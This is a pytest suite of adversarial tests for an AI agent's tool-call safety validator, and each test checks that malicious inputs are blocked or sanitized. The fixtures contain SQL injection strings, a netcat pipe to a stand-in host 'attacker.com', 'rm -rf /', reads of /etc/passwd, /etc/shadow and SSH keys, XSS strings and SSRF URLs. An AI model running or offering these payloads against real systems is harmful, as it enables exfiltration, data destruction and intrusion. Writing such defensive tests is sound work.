"""Adversarial testing for safety validator - tests malicious inputs."""

import pytest
from app.validator import SafetyValidator, ValidationStatus
from app.risk_scorer import RiskLevel


class TestAdversarialInputs:
    """Test suite for adversarial/malicious inputs."""

    @pytest.fixture
    def validator(self):
        """Create validator instance."""
        return SafetyValidator(strict_mode=True)

    # SQL Injection Tests

    def test_sql_injection_drop_table(self, validator):
        """Test SQL injection with DROP TABLE."""
        result = validator.validate(
            user_id="test_user",
            tool="DATABASE_QUERY",
            parameters={"query": "SELECT * FROM users; DROP TABLE users; --"},
        )

        assert result.status == ValidationStatus.BLOCKED
        assert "SQL" in str(result.blocked_reason) or "DROP TABLE" in str(result.blocked_reason)

    def test_sql_injection_union_select(self, validator):
        """Test SQL injection with UNION SELECT."""
        result = validator.validate(
            user_id="test_user",
            tool="DATABASE_QUERY",
            parameters={"query": "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin"},
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_sql_injection_comment(self, validator):
        """Test SQL injection with comment bypass."""
        result = validator.validate(
            user_id="test_user",
            tool="DATABASE_QUERY",
            parameters={"query": "SELECT * FROM users WHERE username='admin' -- AND password='x'"},
        )

        assert result.status == ValidationStatus.BLOCKED

    # Command Injection Tests

    def test_command_injection_pipe(self, validator):
        """Test command injection with pipe."""
        result = validator.validate(
            user_id="test_user",
            tool="SYSTEM_CONTROL",
            parameters={"command": "ls -la | nc attacker.com 4444"},
        )

        assert result.status == ValidationStatus.BLOCKED
        assert "|" in str(result.blocked_reason)

    def test_command_injection_semicolon(self, validator):
        """Test command injection with semicolon."""
        result = validator.validate(
            user_id="test_user",
            tool="SYSTEM_CONTROL",
            parameters={"command": "echo hello; rm -rf /"},
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_command_injection_backticks(self, validator):
        """Test command injection with backticks."""
        result = validator.validate(
            user_id="test_user", tool="SYSTEM_CONTROL", parameters={"command": "echo `whoami`"}
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_command_injection_dollar_paren(self, validator):
        """Test command injection with $(...)."""
        result = validator.validate(
            user_id="test_user",
            tool="SYSTEM_CONTROL",
            parameters={"command": "echo $(cat /etc/passwd)"},
        )

        assert result.status == ValidationStatus.BLOCKED

    # Path Traversal Tests

    def test_path_traversal_dotdot(self, validator):
        """Test path traversal with ../."""
        result = validator.validate(
            user_id="test_user", tool="FILE_OPERATION", parameters={"path": "../../etc/passwd"}
        )

        assert result.status == ValidationStatus.BLOCKED
        assert ".." in str(result.blocked_reason)

    def test_path_traversal_absolute_etc(self, validator):
        """Test path traversal to /etc."""
        result = validator.validate(
            user_id="test_user", tool="FILE_OPERATION", parameters={"path": "/etc/shadow"}
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_path_traversal_windows_system(self, validator):
        """Test path traversal to Windows system directory."""
        result = validator.validate(
            user_id="test_user",
            tool="FILE_OPERATION",
            parameters={"path": "C:\\Windows\\System32\\config\\SAM"},
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_path_traversal_tilde(self, validator):
        """Test path traversal with ~."""
        result = validator.validate(
            user_id="test_user",
            tool="FILE_OPERATION",
            parameters={"path": "~/../../root/.ssh/id_rsa"},
        )

        assert result.status == ValidationStatus.BLOCKED

    # XSS Injection Tests

    def test_xss_script_tag(self, validator):
        """Test XSS with <script> tag."""
        result = validator.validate(
            user_id="test_user",
            tool="SEND_MESSAGE",
            parameters={"message": "<script>alert('XSS')</script>"},
        )

        # Should sanitize XSS
        assert "<script>" not in result.sanitized_parameters.get("message", "")

    def test_xss_javascript_protocol(self, validator):
        """Test XSS with javascript: protocol."""
        result = validator.validate(
            user_id="test_user", tool="WEB_SEARCH", parameters={"url": "javascript:alert('XSS')"}
        )

        # Should block or sanitize
        assert result.status in [ValidationStatus.BLOCKED, ValidationStatus.SANITIZED]

    def test_xss_event_handler(self, validator):
        """Test XSS with event handler."""
        result = validator.validate(
            user_id="test_user",
            tool="NOTE_TAKING",
            parameters={"content": "<img src=x onerror='alert(1)'>"},
        )

        # Should sanitize event handlers
        assert "onerror" not in result.sanitized_parameters.get("content", "")

    # URL Injection Tests

    def test_url_localhost(self, validator):
        """Test URL pointing to localhost."""
        result = validator.validate(
            user_id="test_user",
            tool="WEB_SEARCH",
            parameters={"url": "http://localhost:8080/admin"},
        )

        assert result.status == ValidationStatus.BLOCKED
        assert "localhost" in str(result.blocked_reason)

    def test_url_private_ip(self, validator):
        """Test URL pointing to private IP."""
        result = validator.validate(
            user_id="test_user",
            tool="WEB_SEARCH",
            parameters={"url": "http://192.168.1.1/router/admin"},
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_url_file_protocol(self, validator):
        """Test file:// protocol."""
        result = validator.validate(
            user_id="test_user", tool="WEB_SEARCH", parameters={"url": "file:///etc/passwd"}
        )

        assert result.status == ValidationStatus.BLOCKED

    # Buffer Overflow Tests

    def test_extremely_long_string(self, validator):
        """Test extremely long string (potential buffer overflow)."""
        result = validator.validate(
            user_id="test_user", tool="SEND_MESSAGE", parameters={"message": "A" * 10000}
        )

        # Should block or truncate
        assert result.status in [ValidationStatus.BLOCKED, ValidationStatus.SANITIZED]

    def test_extremely_large_number(self, validator):
        """Test extremely large number."""
        result = validator.validate(
            user_id="test_user", tool="SET_TIMER", parameters={"duration": 999999999999999999}
        )

        assert result.status == ValidationStatus.BLOCKED

    # Blocked Tools Tests

    def test_system_shutdown_blocked(self, validator):
        """Test SYSTEM_SHUTDOWN is always blocked."""
        result = validator.validate(user_id="test_user", tool="SYSTEM_SHUTDOWN", parameters={})

        assert result.status == ValidationStatus.BLOCKED
        assert result.risk_score.level == RiskLevel.CRITICAL

    def test_format_drive_blocked(self, validator):
        """Test FORMAT_DRIVE is always blocked."""
        result = validator.validate(
            user_id="test_user", tool="FORMAT_DRIVE", parameters={"drive": "C:"}
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_delete_file_blocked(self, validator):
        """Test DELETE_FILE is blocked."""
        result = validator.validate(
            user_id="test_user", tool="DELETE_FILE", parameters={"path": "/important/data.db"}
        )

        assert result.status == ValidationStatus.BLOCKED

    # PII Detection Tests

    def test_credit_card_detection(self, validator):
        """Test credit card number detection."""
        result = validator.validate(
            user_id="test_user",
            tool="SEND_MESSAGE",
            parameters={"message": "My card is 4532-1234-5678-9010"},
        )

        # Should detect PII
        assert any("PII" in w or "credit_card" in w for w in result.warnings)

    def test_ssn_detection(self, validator):
        """Test SSN detection."""
        result = validator.validate(
            user_id="test_user", tool="NOTE_TAKING", parameters={"content": "SSN: 123-45-6789"}
        )

        assert any("PII" in w or "ssn" in w for w in result.warnings)

    def test_email_in_parameters(self, validator):
        """Test email detection in parameters."""
        result = validator.validate(
            user_id="test_user",
            tool="SEND_MESSAGE",
            parameters={"message": "Contact me at attacker@evil.com"},
        )

        # Email might be flagged as PII depending on context
        assert result.status in [ValidationStatus.APPROVED, ValidationStatus.SANITIZED]

    # Rate Limiting Tests

    def test_rate_limiting_high_risk(self, validator):
        """Test rate limiting for high-risk actions."""
        # Execute 11 high-risk actions rapidly
        for i in range(11):
            result = validator.validate(
                user_id="rate_limit_test",
                tool="SEND_EMAIL",
                parameters={"to": "test@example.com", "subject": f"Test {i}"},
            )

        # Last one should be blocked due to rate limit
        assert result.status == ValidationStatus.BLOCKED
        assert "rate limit" in str(result.blocked_reason).lower()

    # Application Whitelist Tests

    def test_unknown_application(self, validator):
        """Test unknown application not on whitelist."""
        result = validator.validate(
            user_id="test_user",
            tool="OPEN_APPLICATION",
            parameters={"app_name": "malicious_backdoor.exe"},
        )

        # Should warn or block in strict mode
        assert len(result.warnings) > 0 or result.status == ValidationStatus.BLOCKED

    def test_allowed_application(self, validator):
        """Test allowed application."""
        result = validator.validate(
            user_id="test_user", tool="OPEN_APPLICATION", parameters={"app_name": "chrome"}
        )

        # Should be approved or require confirmation (based on risk)
        assert result.status in [
            ValidationStatus.APPROVED,
            ValidationStatus.REQUIRES_CONFIRMATION,
            ValidationStatus.SANITIZED,
        ]

    # Nested Parameter Injection Tests

    def test_nested_sql_injection(self, validator):
        """Test SQL injection in nested parameters."""
        result = validator.validate(
            user_id="test_user",
            tool="DATABASE_QUERY",
            parameters={"table": "users", "filters": {"id": "1; DROP TABLE users; --"}},
        )

        assert result.status == ValidationStatus.BLOCKED

    def test_nested_command_injection(self, validator):
        """Test command injection in nested dict."""
        result = validator.validate(
            user_id="test_user",
            tool="SYSTEM_CONTROL",
            parameters={"action": "run", "options": {"script": "echo hello && rm -rf /"}},
        )

        assert result.status == ValidationStatus.BLOCKED

    # Unicode and Encoding Attacks

    def test_unicode_bypass_attempt(self, validator):
        """Test Unicode encoding bypass attempt."""
        result = validator.validate(
            user_id="test_user",
            tool="SEND_MESSAGE",
            parameters={"message": "\u003cscript\u003ealert('XSS')\u003c/script\u003e"},
        )

        # Should sanitize or block
        assert result.status in [ValidationStatus.APPROVED, ValidationStatus.SANITIZED]

    # Batch Validation Tests

    def test_batch_with_malicious_tool(self, validator):
        """Test batch validation stops on critical risk."""
        tool_calls = [
            {"tool": "GET_WEATHER", "parameters": {"location": "Paris"}},
            {"tool": "SYSTEM_SHUTDOWN", "parameters": {}},  # Should block here
            {"tool": "SEND_EMAIL", "parameters": {"to": "test@example.com"}},
        ]

        results = validator.validate_batch("test_user", tool_calls)

        # Should stop at second tool (SYSTEM_SHUTDOWN)
        assert len(results) == 2
        assert results[1].status == ValidationStatus.BLOCKED


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.fixture
    def validator(self):
        return SafetyValidator()

    def test_empty_parameters(self, validator):
        """Test empty parameters."""
        result = validator.validate(user_id="test_user", tool="HELP", parameters={})

        assert result.status in [ValidationStatus.APPROVED, ValidationStatus.SANITIZED]

    def test_null_values(self, validator):
        """Test null/None values in parameters."""
        result = validator.validate(
            user_id="test_user", tool="NOTE_TAKING", parameters={"content": None, "title": "Test"}
        )

        assert result.status in [ValidationStatus.APPROVED, ValidationStatus.SANITIZED]

    def test_special_characters(self, validator):
        """Test special characters in parameters."""
        result = validator.validate(
            user_id="test_user",
            tool="NOTE_TAKING",
            parameters={"content": "Test @#$%^&*()_+{}[]|\\:;\"'<>,.?/"},
        )

        # Special chars should be handled gracefully
        assert result.status in [ValidationStatus.APPROVED, ValidationStatus.SANITIZED]

    def test_mixed_language_input(self, validator):
        """Test mixed language input."""
        result = validator.validate(
            user_id="test_user", tool="SEND_MESSAGE", parameters={"message": "Hello 你好 مرحبا"}
        )

        assert result.status in [
            ValidationStatus.APPROVED,
            ValidationStatus.SANITIZED,
            ValidationStatus.REQUIRES_CONFIRMATION,
        ]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
